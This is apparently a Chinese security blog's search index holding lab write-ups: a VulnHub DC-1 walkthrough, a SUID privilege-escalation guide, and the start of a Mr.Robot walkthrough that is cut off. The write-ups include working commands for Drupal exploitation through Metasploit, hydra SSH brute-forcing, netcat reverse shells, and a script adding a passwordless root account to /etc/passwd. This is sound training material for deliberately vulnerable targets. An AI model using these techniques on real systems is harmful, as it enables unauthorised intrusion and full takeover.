<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>vulnhub-DC系列1</title>
    <link href="/2022/04/12/vulhub-DC1/"/>
    <url>/2022/04/12/vulhub-DC1/</url>
    
    <content type="html"><![CDATA[<h3 id="1-写在前面"><a href="#1-写在前面" class="headerlink" title="1.写在前面"></a>1.写在前面</h3><blockquote><p>这里是vulnhub靶场练习的第二篇，也是DC系列的第一个，后续计划完成1-8整个DC系列。</p><p>学习过程中不应该拘泥于实现的具体细节，先掌握整体思路和方法及技巧。</p><p>后续再慢慢补充漏洞深入的研究。当然，并不是说理解漏洞原理不重要，毕竟这是一切的前提。</p><p>Tips：DC1 一共有5个flag</p></blockquote><h3 id="2-知识点速记"><a href="#2-知识点速记" class="headerlink" title="2.知识点速记"></a>2.知识点速记</h3><ul><li>msf-payload速查</li><li>meterpreter的使用</li><li>mysql查询</li><li>数据库密码重置-思路</li><li>hydra爆破</li><li>suid提权-find</li></ul><hr><h3 id="3-环境配置"><a href="#3-环境配置" class="headerlink" title="3.环境配置"></a>3.环境配置</h3><p>直接去vulnhub官网下载 <a href="https://www.vulnhub.com/entry/dc-1,292/">Vulnhub-DC1</a>对应的ova文件即可，然后拖入vmware。这里为了方便宿主机与靶机通讯，将虚拟机的网络模式设置为了<strong>NAT</strong>模式</p><p>Win10 宿主机、kali2020 攻击机、vulnhub靶机 </p><h3 id="4-信息收集"><a href="#4-信息收集" class="headerlink" title="4.信息收集"></a>4.信息收集</h3><p>环境配置好后，首先确认一下IP，在kali上查看当前IP为 192.168.114.128</p><p>对当前网段的主机进行扫描</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment">## 粗扫一遍，确认IP</span><br>nmap -sT -R 192.168.114.128/24<br><span class="hljs-comment">## 洗扫，确认详细指纹（这里用 -A 参数，可以更多的获取系统信息、组件版本信息、脚本扫描等）</span><br>nmap -A -sT4 目标ip<br></code></pre></div></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/1649734628(1).jpg" alt="" style="zoom:67%;" /><p>目标主机<code>192.168.114.131</code>，存在开放端口<code>22、80、111</code>。</p><ul><li>http：drupal 7，暴露robots.txt</li><li>ssh：先记着，后面有用</li></ul><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497341692359.png" alt="" style="zoom:67%;" /><p>看了看网站的robots.txt，几个文件都没有什么有用的信息。</p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220412175948410.png" alt="" style="zoom:67%;" /><hr><h3 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5.漏洞利用"></a>5.漏洞利用</h3><h4 id="5-1-msf-payload速查漏洞"><a href="#5-1-msf-payload速查漏洞" class="headerlink" title="5.1 msf-payload速查漏洞"></a>5.1 msf-payload速查漏洞</h4><p><strong>这里引出第一个常规思路：</strong> 在爆破、字典等常规操作无果后，如果已知网站的框架或组件，可以去搜索对应框架、组件的版本是否存在漏洞，这里去搜索drupal7漏洞，可以发现有很多可以尝试的，我们可以一一测试。当然在kali下，msf已经集成了常规框架的测试payload，非常的方便进行盲测。</p><blockquote><p><strong>知识点1：msf-payload速查</strong></p></blockquote><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">msfconsole<br>msf6 &gt; search drupal<br></code></pre></div></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_1649741917775.png"></p><p>这里可以看到有非常多的模块可利用，简单粗暴的方式，从头到位撸一遍。然后发现上图中的第二个是能够反弹shell的。</p><blockquote><p>PS：其实最常规的做法是用扫描器扫一遍，然后根据扫描器提供的准确漏洞信息，再去msf中寻找利用模块。当然如果基于poc自行测试，那更好。</p></blockquote><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497430204391.png" alt="img" style="zoom: 80%;" /><p>反弹的shell是meterpreter的形式，这里需要提前了解下meterpreter的使用。（太久没用，忘记使用shell进本地终端了…）。顺便生成一个交互式的tty(如何生成交互式shell，可见 Vulnhub-Mr.robot 这篇文章)</p><blockquote><p><strong>知识点2：meterpreter使用</strong></p><p><a href="https://blog.csdn.net/wy_97/article/details/78838252">meterpreter常用命令集合</a></p></blockquote><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497429863368(1).png" alt="img" style="zoom:80%;" /><p>至此，我们成功获取flag1，flag1提示我们去找网站的配置文件。</p><hr><h4 id="5-2-mysql重置web密码"><a href="#5-2-mysql重置web密码" class="headerlink" title="5.2 mysql重置web密码"></a>5.2 mysql重置web密码</h4><p><strong>常规思路2：</strong>一般来说，网站框架的配置文件中，可能含有后台登录密码、数据库连接信息等。获取这些有助于进一步分析利用。</p><p>搜索了下drupal的后台文件路径<code>/var/www/sites/default/settings.php</code>。查看下这个文件，果然不出所料，我们得到了flag2和一个本地mysql的账号密码。</p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_1649743235274.png" alt="img" style="zoom: 80%;" /><p>这里flag2也给出了提示，<em>暴力破解和字典并不是获得权限的唯一方式！</em>，暗示了别从web侧找思路了……</p><p>看了下，本地也确实开放了3306端口，开搞！</p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497435223348.png" alt="img" style="zoom: 80%;" /><blockquote><p><strong>知识点3：mysql语句</strong></p></blockquote><p>这里登录mysql，对下面的数据库及表进行检索，drupal的用户，是默认存放在drupaldb数据库-&gt;users表下的。</p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_1649744639650.png" alt="img" style="zoom:80%;" /><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/test111.png" alt="img" style="zoom: 80%;" /><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">$ mysql -u dbuser -p R0ck3t -D drupaldb<br>mysql&gt; show databases;<br>mysql&gt; use drupaldb;<br>mysql&gt; show tables;<br>mysql&gt; select * from users;<br>mysql&gt; select user,pass from users;<br></code></pre></div></td></tr></table></figure><p>上面的账号及密码显示不全，这里单独检索name和pass进行展示，得到了admin的账号及密码。但这里的密码并非是明文或者md5加密的，想要破解可能很难。</p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497495159921.png" alt="img" style="zoom:80%;" /><blockquote><p><strong>知识点4：数据库密码重置-思路</strong></p><p>这里的核心其实是如何打开思维，去思考重置的方式。如何利用搜索引擎去定位问题。<code>drupal7重置密码</code>,<code>drupal忘记密码怎么办?</code>，<code>drupal后台修改密码</code>，以上这些tag都可以帮助找寻重置密码的方法，不要限制自己的思维！</p></blockquote><p><strong>经过搜索，得到以下重置管理员密码的方法：</strong></p><ol><li>通过邮箱重置密码：drupal提供了邮箱重置密码功能，那通过修改邮箱地址，就可以重置密码。</li><li>通过drupal预置的密码生成脚本，生成新的密码，脚本位置&#x2F;scripts&#x2F;password-hash.sh</li><li>自己创建一个账号密码，把加密后的密码覆盖admin，或者本地搭建一个，看下admin默认密码。</li></ol><p>这里最开始想到的是方法1，但是后面发现这个虚拟机drupal没有配邮件服务，这个路是走不通的，但实战中应该是ok的。然后是方式3，方式3是最容易想到的，因为毕竟破解难的话，我就不破解密码了，直接用加密后的密码覆盖即可。最后才是方式2，因为不深入搜索和学习，很难获知还有这么个脚本的存在。</p><p>这里我直接使用方式3一步到位。（Po一下百度搜索的结果）</p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_1649749858985.png" alt="img" style="zoom: 80%;" /><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">mysql&gt; update users set pass=&#x27;$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4&#x27; where name=&#x27;admin&#x27;<br></code></pre></div></td></tr></table></figure><p>上面的pass其实就是password经过drupal的SHA2加密后的密文</p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497498223277.png" alt="img" style="zoom:80%;" /><hr><h3 id="6-权限提升"><a href="#6-权限提升" class="headerlink" title="6.权限提升"></a>6.权限提升</h3><p>mysql重置完密码后，登录web后台随便翻翻，在Dashbord找到了第三个flag</p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497500735014.png"></p><p>flag3给的提示，有几个关键词，<code>perms、find、passwd、-exec、shadow</code></p><ul><li><code>passwd和shadow</code>，想到去看看本地passwd文件，看没有什么线索。</li><li><code>perms、find 和 -exec</code>，其实这里已经暗示了suid的find命令提权（和靶机Mr.robot对应上了）</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220413113837457.png"></p><p>那我们先看下&#x2F;etc&#x2F;passwd吧，发现存在flag4用户，家目录<code>/home/flag4</code>，进去得到了flag4，提示可以用同样的方式获得flag5。</p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220413114742608.png"></p><p>但flag5是在root目录下的，我们一个普通用户是看不了滴，所以得想想怎么提权到root。</p><h4 id="6-1-hydra爆破ssh密码"><a href="#6-1-hydra爆破ssh密码" class="headerlink" title="6.1 hydra爆破ssh密码"></a>6.1 hydra爆破ssh密码</h4><p>上面发现可以直接cd 到 flag4目录下并查看flag4.txt，所以并没有想到如何提权到flag4用户。之后看了其他的writeup，发现是可以通过爆破前面的22端口ssh获取到flag4的密码的，这里也简单学习下，多个思路。</p><blockquote><p><strong>知识点5：</strong>hydra爆破口令</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">hydra -u flag4 -P <span class="hljs-regexp">/home/</span>password.dic ssh:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">114.131</span> <br></code></pre></div></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497564287279.png"></p><p>后续ssh过去（不过倒是方便了之后进shell，不用非得在msf下维持了）</p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497564834480.png"></p><hr><h4 id="6-2-SUID提权-find"><a href="#6-2-SUID提权-find" class="headerlink" title="6.2 SUID提权-find"></a>6.2 SUID提权-find</h4><p>回归正题，我们的目标是提权到root。根据前面的提示<code>perms、find、-exec</code>，可以很明显知道是要利用SUID提权了。这里如果对SUID提权不了解，可以看下之前总结的一篇博客，SUID提权（挖个坑）。</p><blockquote><p><strong>知识点6：</strong>SUID-find提权</p><p>如果Find命令是以suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。</p><p>而使用find查找的时候，可以通过加入-exec 参数来执行测试表达式（理解为并列执行的意思），从而以root权限执行系统命令。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497510618652.png"></p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment">## -p是bash的参数，指的是如果uid和euid(或者说是suid)不一致的时候，如果不加-p，则euid会强制变成uid，从而无法反弹root的shell</span><br>find test_find -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \;<br>find test_find -<span class="hljs-built_in">exec</span> /bin/bash -p \;<br>find test_find -<span class="hljs-built_in">exec</span> nc 192.168.114.128 5566 -e /bin/bash/ -p \;<br></code></pre></div></td></tr></table></figure><p>有关find反弹shell和-p参数，可参考这篇：<a href="https://zhuanlan.zhihu.com/p/156795223?from_voters_page=true">为什么通过 find SUID 提权反弹的 shell 不是 root 权限？</a></p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497547303366.png"></p><p>这里成功得到root权限，按照flag4的提示，进入&#x2F;root&#x2F;下，得到最终flag，打完收工！</p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497548807005.png"></p><hr><h3 id="7-写在结尾"><a href="#7-写在结尾" class="headerlink" title="7.写在结尾"></a>7.写在结尾</h3><p><strong>对DC1学习内容做个复盘：</strong></p><blockquote><p><strong>漏洞利用部分：</strong>主要是如何快速信息收集，从而获取网站的漏洞。在进入后台后获取系统配置文件，并根据配置文件，获得mysql账号，从而通过mysql修改web网站密码，登录web应用系统。</p><p><strong>提权部分：</strong>提权部分主要还是通过端口服务密码爆破(flag4)及suid命令提权</p><p><strong>其他亮点：</strong>DC1的主要亮点，感觉在于drupal的密码重置，需要掌握一定的信息挖掘和检索的思路。</p></blockquote><p><strong>几个不错的writeup：</strong></p><p><a href="https://cloud.tencent.com/developer/article/1910084">ulnhub靶机渗透之DC-1提权和Drupal漏洞利用</a></p><p><a href="https://blog.csdn.net/weixin_44288604/article/details/108027062">vulnhub之DC1靶机</a></p><p><a href="https://blog.csdn.net/qq_17592003/article/details/95985962">对DC-1靶机进行渗透测试</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>vulnhub靶场练习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场练习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SUID提权</title>
    <link href="/2022/04/08/SUID%E6%8F%90%E6%9D%83/"/>
    <url>/2022/04/08/SUID%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h2 id="1-SUID原理理解"><a href="#1-SUID原理理解" class="headerlink" title="1.SUID原理理解"></a>1.SUID原理理解</h2><blockquote><p>什么是suid？suid全称是<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on execution。这是Linux给可执行文件的一个属性。</p></blockquote><p>这个属性使得其他用户执行这个程序的时候可以<strong>以该程序所有者&#x2F;组的权限与身份来运行。</strong></p><p>当为可执行文件设置SUID并产生进程后，该进程的<strong>属主为原程序文件的属主</strong>，<strong>以其属主的身份</strong>进行操作。</p><blockquote><p>普通用户之所以也可以使用ping命令，原因就在我们给ping这个可执行文件设置了suid权限。</p></blockquote><p>设置了s位的程序在运行时，其<strong>Effective UID</strong>将会设置为这个程序的所有者。</p><p>比如，<code>/bin/ping</code>这个程序的所有者是0（root），它设置了s位，那么普通用户在运行ping时其<strong>Effective UID</strong>就是0等同于拥有了root权限。</p><figure class="highlight objectivec"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs objectivec">这里引入了一个新的概念 Effective <span class="hljs-built_in">UID</span>。Linux进程在运行时有三个<span class="hljs-built_in">UID</span>：<br>- Real <span class="hljs-built_in">UID</span> 执行该进程的用户实际的<span class="hljs-built_in">UID</span><br>- Effective <span class="hljs-built_in">UID</span> 程序实际操作时生效的<span class="hljs-built_in">UID</span>（比如写入文件时，系统会检查这个<span class="hljs-built_in">UID</span>是否有权限）<br>- Saved <span class="hljs-built_in">UID</span> 在高权限用户降权后，保留的其原本<span class="hljs-built_in">UID</span>（本文中不对这个<span class="hljs-built_in">UID</span>进行深入探讨）<br></code></pre></div></td></tr></table></figure><p>通常情况下Effective UID和Real UID相等，所以普通用户不能写入只有UID&#x3D;0号才可写的<code>/etc/passwd</code>；</p><p>有suid的程序启动时，eUID就等于二进制文件的所有者，此时Real UID就可能和eUID<strong>不相等</strong>了。</p><p>(这里划重点，后面会利用)</p><h3 id="1-1-利用SUID提权的条件"><a href="#1-1-利用SUID提权的条件" class="headerlink" title="1.1 利用SUID提权的条件"></a>1.1 利用SUID提权的条件</h3><ol><li>程序存在suid权限</li><li>程序的属主是0号或者其他super user    </li><li>程序运行的进程存在命令注入漏洞or本身可执行命令</li></ol><p>关于linux不同发行版本存在的限制及linux安全配置问题可参考文章：<a href="https://cloud.tencent.com/developer/article/1717979">Linux与suid提权</a></p><hr><h2 id="2-SUID提权"><a href="#2-SUID提权" class="headerlink" title="2.SUID提权"></a>2.SUID提权</h2><p>已知的可用来提权的linux可执行文件列表如下：</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">Nmap<br>Vim<br>find<br>Bash<br>More<br>Less<br>Nano<br><span class="hljs-built_in">cp</span><br></code></pre></div></td></tr></table></figure><p>以下命令用于发现系统上运行的SUID可执行文件。命令将尝试<strong>查找具有root权限的SUID的文件</strong>。</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -ldb &#123;&#125; \;<br><br>解释一下find 命令的参数：<br>1.-perm (permission)，匹配权限。<br>4000 2000 1000分别表示SUID SGID SBIT<br>2.-<span class="hljs-built_in">print</span> 输出流设置，2为标准错误 /dev/null为黑洞设备（收到的信息全部丢弃）<br>2&gt;dev/null 将标准错误丢弃<br>3.-<span class="hljs-built_in">exec</span> <span class="hljs-built_in">command</span> &#123;&#125; \;  对find匹配到的文件执行<span class="hljs-built_in">command</span>命令<br>&#123;&#125;表示由find找到的内容，都会被放到&#123;&#125;中<br>即执行<span class="hljs-built_in">ls</span> -ldb命令<br></code></pre></div></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20210112105948697.png"></p><p>如下ping等命令查看权限，带有s标志位。</p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20210112105918309.png"></p><hr><h3 id="2-1-Nmap"><a href="#2-1-Nmap" class="headerlink" title="2.1 Nmap"></a>2.1 Nmap</h3><h4 id="2-1-1-interactive交互"><a href="#2-1-1-interactive交互" class="headerlink" title="2.1.1 interactive交互"></a>2.1.1 interactive交互</h4><p>较旧版本的Nmap（<strong>2.02至5.21</strong>）具有交互模式<strong>interactive</strong>，允许用户执行shell命令。</p><p>由于Nmap在使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">nmap -v<br>nmap --interactive<br><br>以下命令将提供一个提升的shell：<br>nmap&gt; !sh<br>sh-3.2<span class="hljs-comment"># whoami</span><br>root<br></code></pre></div></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20210112111917281.png" alt="image-20210112111917281" style="zoom:80%;" /><p>也可以通过msf的模块对nmap进行权限提升<code>exploit/unix/local/setuid_nmap</code></p><p>使用命令<code>chmod u+s nmap</code>给nmap赋予suid</p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20210112112258357.png" alt="image-20210112112258357"  /><h4 id="2-1-2-–script参数"><a href="#2-1-2-–script参数" class="headerlink" title="2.1.2 –script参数"></a>2.1.2 –script参数</h4><p>因为nmap script中使用的是<strong>lua</strong>语言，而lua库中似乎没有直接启动进程的方式，都会依赖系统shell，所以我们可能并不能直接通过执行shell的方式来提权。但是因为此时nmap已经是root权限，我们可以通过修改<code>/etc/passwd</code>的方式来添加一个新的super user：</p><p>来看一眼<code>/etc/passwd</code>，只有root权限可以写入的。</p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20210112114111008.png"></p><p>nmap –script 加载lua脚本：</p><figure class="highlight lua"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> file = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>file:<span class="hljs-built_in">write</span>(<span class="hljs-string">&quot;root2::0:0::/root:/bin/bash\n&quot;</span>)//代表空密码<br>file:<span class="hljs-built_in">close</span>()<br></code></pre></div></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20210112113815962.png"></p><hr><h3 id="2-2-VIM"><a href="#2-2-VIM" class="headerlink" title="2.2 VIM"></a>2.2 VIM</h3><p>如果vim是以suid运行的话，其权限会继承自root用户，因此可以读取系统上的所有文件。</p><p>如下将vim设置为suid，cat权限不够，而用vim就可以查看。</p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20210112133148606.png"></p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">vim<br><span class="hljs-comment"># Press ESC key</span><br><span class="hljs-comment">## !command 表示在vim中执行shell命令</span><br>:!<span class="hljs-built_in">command</span><br><span class="hljs-comment">## 例子返回一个bash的shell</span><br>:! /bin/bash -p <br></code></pre></div></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220413162231762.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220413162143700.png"></p><hr><h3 id="2-3-Find"><a href="#2-3-Find" class="headerlink" title="2.3 Find"></a>2.3 Find</h3><p>如果Find命令也是以suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。</p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20210112141511367.png"></p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-built_in">touch</span> test_find<br>find test_find -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \;<br></code></pre></div></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20210112142241286.png"></p><p>当然，大部分Linux操作系统都安装了netcat，因此可以直接反弹shell来提升root权限。</p><p><strong>反弹shell</strong></p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">find test_find -<span class="hljs-built_in">exec</span> netcat -lvp 5555 -e /bin/bash \;<br>find test_find -<span class="hljs-built_in">exec</span> <br></code></pre></div></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/1111.png"></p><hr><h3 id="2-4-Less-More"><a href="#2-4-Less-More" class="headerlink" title="2.4 Less More"></a>2.4 Less More</h3><p>Less和More都执行以用来提权。</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">less /etc/passwd<br>!/bin/sh<br></code></pre></div></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20210112145759688.png"></p><hr><h3 id="2-5-python"><a href="#2-5-python" class="headerlink" title="2.5 python"></a>2.5 python</h3><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">python -c <span class="hljs-string">&#x27;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27;</span><br></code></pre></div></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20210112154704826.png" alt="image-20210112154704826" style="zoom: 67%;" /><hr><h3 id="2-6-php"><a href="#2-6-php" class="headerlink" title="2.6 php"></a>2.6 php</h3><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">CMD=<span class="hljs-string">&quot;/bin/sh&quot;</span><br>php -r <span class="hljs-string">&quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;</span><br></code></pre></div></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20210112154934283.png" alt="image-20210112154934283" style="zoom:67%;" /><hr><h3 id="2-7-SUID利用汇总"><a href="#2-7-SUID利用汇总" class="headerlink" title="2.7 SUID利用汇总"></a>2.7 SUID利用汇总</h3><p>如下链接 <strong>汇总了44种 suid 提权的文件&#x2F;应用的提权方式：</strong><a href="https://www.freebuf.com/articles/system/244627.html">CentOS7_suid提权</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>提权</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-Mr.Robot</title>
    <link href="/2022/03/29/vulhub-Mr.robot/"/>
    <url>/2022/03/29/vulhub-Mr.robot/</url>
    
    <content type="html"><![CDATA[<h3 id="1-写在前面"><a href="#1-写在前面" class="headerlink" title="1.写在前面"></a>1.写在前面</h3><blockquote><p>计划按照OSCP的学习路线，从头开始学习并复现vulnhub的靶场环境，在此进行记录</p><p>Mr.robot其实是个美剧，之前看过一些，算是脑洞大开的一类，除此之外还有 《硅谷》，都是比较出众的IT类型影视剧。</p></blockquote><h3 id="2-知识点速记"><a href="#2-知识点速记" class="headerlink" title="2.知识点速记"></a>2.知识点速记</h3><ul><li>目录及登录爆破</li><li>wordpress后台getshell</li><li>Linux下shell反弹</li><li>普通shell及交互式shell</li><li>suid提权</li><li>基础Linux知识</li></ul><hr><h3 id="3-环境配置"><a href="#3-环境配置" class="headerlink" title="3.环境配置"></a>3.环境配置</h3><p>直接去vulnhub官网下载对应的ova文件即可，然后拖入vmware。这里为了方便宿主机与靶机通讯，将虚拟机的网络模式设置为了<strong>NAT</strong>模式</p><p>Win10 宿主机、kali2020 攻击机、vulnhub靶机 </p><h3 id="4-信息收集"><a href="#4-信息收集" class="headerlink" title="4.信息收集"></a>4.信息收集</h3><p>环境配置好后，首先确认一下IP，在kali上查看当前IP为 192.168.114.128</p><p>对当前网段的主机进行扫描，可使用的命令如下：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -R <span class="hljs-number">192.168.114.0</span>/<span class="hljs-number">24</span><br><span class="hljs-attribute">arp</span>-scan <span 